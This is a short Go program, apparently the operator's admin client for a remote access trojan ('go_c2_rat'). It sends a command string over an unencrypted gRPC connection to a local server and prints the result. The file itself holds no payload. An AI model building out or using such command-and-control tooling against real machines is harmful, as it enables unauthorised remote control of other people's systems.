package main

import (
	"context"
	"fmt"
	"log"
	"os"

	"github.com/jonaserhart/go_c2_rat/pb"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client pb.AdminClient
	)

	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if conn, err = grpc.NewClient(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil {
		log.Fatal(err)

	}
	defer conn.Close()
	client = pb.NewAdminClient(conn)


	cmd := new(pb.Command)
	cmd.In = os.Args[1]
	ctx := context.Background()
	cmd, err = client.RunCommand(ctx, cmd)

	// if err != nil {
	// 	log.Fatal(err)
	// }
	fmt.Println(cmd.Out)
}
